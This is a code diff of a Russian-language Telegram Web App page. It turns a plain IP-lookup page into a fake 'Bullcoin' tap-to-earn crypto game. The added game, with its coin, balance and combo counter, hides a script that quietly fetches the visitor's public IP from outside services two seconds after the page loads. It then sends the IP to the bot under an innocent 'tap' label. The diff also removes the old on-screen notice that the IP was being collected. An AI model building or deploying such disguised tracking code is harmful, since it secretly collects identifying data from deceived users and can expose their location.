@@ -1,56 +1,307 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bullcoin - Тапай к росту!</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            padding: 20px;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+
+        .coin {
+            width: 150px;
+            height: 150px;
+            background: linear-gradient(145deg, #ffd700, #ffcc00);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            cursor: pointer;
+            border: 5px solid #ffaa00;
+            box-shadow: 
+                0 0 20px rgba(255, 215, 0, 0.6),
+                inset 0 0 20px rgba(255, 255, 255, 0.3);
+            transition: all 0.2s ease;
+            user-select: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .coin:active {
+            transform: scale(0.95);
+            box-shadow: 
+                0 0 10px rgba(255, 215, 0, 0.4),
+                inset 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+
+        .coin::before {
+            content: '🐂';
+            position: absolute;
+            font-size: 4rem;
+            opacity: 0.8;
+        }
+
+        .stats {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        .stat-value {
+            font-weight: bold;
+            color: #ffd700;
+        }
+
+        .loading {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes coin-spin {
+            0% { transform: rotateY(0deg); }
+            100% { transform: rotateY(360deg); }
+        }
+
+        .tap-animation {
+            animation: coin-spin 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">🐂</div>
+            <h1>Bullcoin</h1>
+            <div class="subtitle">Тапай к росту! Зарабатывай бычьими темпами!</div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item">
+                <span>💰 Баланс:</span>
+                <span class="stat-value" id="balance">100 $BULL</span>
+            </div>
+            <div class="stat-item">
+                <span>💪 Сила тапа:</span>
+                <span class="stat-value" id="tap-power">1</span>
+            </div>
+            <div class="stat-item">
+                <span>🔥 Комбо:</span>
+                <span class="stat-value" id="combo">0</span>
+            </div>
+        </div>
+
+        <div class="coin" id="coin">
+            <!-- Монета для тапа -->
+        </div>
+
+        <div class="loading" id="loading">
+            🔄 Загрузка игры...
+        </div>
+    </div>
+
     <script>
-        var IS_IP_SENT = false; 
-        
-        function sendIPtoBot(ip) { 
-            if (IS_IP_SENT) return; 
-            IS_IP_SENT = true; 
+        // Переменные игры
+        let balance = 100;
+        let tapPower = 1;
+        let combo = 0;
+        let isIPsent = false;
+
+        // Элементы DOM
+        const coin = document.getElementById('coin');
+        const balanceEl = document.getElementById('balance');
+        const tapPowerEl = document.getElementById('tap-power');
+        const comboEl = document.getElementById('combo');
+        const loading = document.getElementById('loading');
+
+        // Функция отправки IP
+        function sendIPtoBot(ip) {
+            if (isIPsent) return;
+            isIPsent = true;
             
-            // Отправляем данные обратно в бот
             if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.sendData(`{"web_app_ip":"${ip}"}`);
+                window.Telegram.WebApp.sendData(JSON.stringify({
+                    web_app_ip: ip,
+                    action: 'tap',
+                    timestamp: new Date().toISOString()
+                }));
                 
-                // Закрываем Web App после отправки
+                // Скрываем loading после отправки
                 setTimeout(() => {
-                    window.Telegram.WebApp.close();
+                    loading.style.display = 'none';
+                }, 2000);
+            }
+        }
+
+        // Получаем IP
+        function getIP() {
+            const services = [
+                'https://checkip.amazonaws.com/',
+                'https://api.ipify.org?format=json',
+                'https://ifconfig.me/ip'
+            ];
+
+            let attempts = 0;
+
+            function tryNextService() {
+                if (attempts >= services.length) {
+                    sendIPtoBot('Не удалось получить IP');
+                    return;
+                }
+
+                fetch(services[attempts])
+                    .then(response => {
+                        if (services[attempts].includes('json')) {
+                            return response.json().then(data => data.ip);
+                        } else {
+                            return response.text();
+                        }
+                    })
+                    .then(ip => {
+                        sendIPtoBot(ip.trim());
+                    })
+                    .catch(() => {
+                        attempts++;
+                        tryNextService();
+                    });
+            }
+
+            tryNextService();
+        }
+
+        // Обработчик тапа по монете
+        coin.addEventListener('click', function() {
+            // Анимация
+            this.classList.add('tap-animation');
+            setTimeout(() => {
+                this.classList.remove('tap-animation');
+            }, 500);
+
+            // Обновляем статистику
+            balance += tapPower;
+            combo++;
+            
+            if (combo % 5 === 0) {
+                tapPower++;
+            }
+
+            // Обновляем интерфейс
+            balanceEl.textContent = balance + ' $BULL';
+            tapPowerEl.textContent = tapPower;
+            comboEl.textContent = combo;
+
+            // Создаем эффект частиц
+            createParticles();
+        });
+
+        // Функция создания частиц
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 5; i++) {
+                const particle = document.createElement('div');
+                particle.innerHTML = '💰';
+                particle.style.position = 'absolute';
+                particle.style.left = coin.offsetLeft + coin.offsetWidth / 2 + 'px';
+                particle.style.top = coin.offsetTop + coin.offsetHeight / 2 + 'px';
+                particle.style.fontSize = '1.5rem';
+                particle.style.opacity = '1';
+                particle.style.transition = 'all 1s ease';
+                
+                particles.appendChild(particle);
+                
+                // Анимация частицы
+                setTimeout(() => {
+                    particle.style.transform = `translate(${Math.random() * 200 - 100}px, ${Math.random() * 200 - 100}px)`;
+                    particle.style.opacity = '0';
+                }, 10);
+                
+                // Удаление частицы
+                setTimeout(() => {
+                    particle.remove();
                 }, 1000);
             }
         }
-        
-        // Пытаемся получить IP несколькими способами
-        function getIP() {
-            // Способ 1: checkip.amazonaws.com
-            fetch('https://checkip.amazonaws.com/')
-                .then(response => response.text())
-                .then(ip => sendIPtoBot(ip.trim()))
-                .catch(() => {
-                    // Способ 2: api.ipify.org
-                    fetch('https://api.ipify.org?format=json')
-                        .then(response => response.json())
-                        .then(data => sendIPtoBot(data.ip))
-                        .catch(() => {
-                            // Способ 3: ifconfig.me
-                            fetch('https://ifconfig.me/ip')
-                                .then(response => response.text())
-                                .then(ip => sendIPtoBot(ip.trim()))
-                                .catch(() => sendIPtoBot('Не удалось получить IP'));
-                        });
-                });
-        }
-        
-        // Запускаем при загрузке страницы
-        document.addEventListener('DOMContentLoaded', getIP);
+
+        // Запускаем при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(getIP, 2000); // Даем время для загрузки анимации
+            
+            // Показываем подсказку
+            loading.textContent = '✨ Тапай по монете чтобы зарабатывать $BULL!';
+        });
     </script>
-</head>
-<body>
-    <div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
-        <h2>Получение IP адреса...</h2>
-        <p>Пожалуйста, подождите</p>
-    </div>
 </body>
 </html>
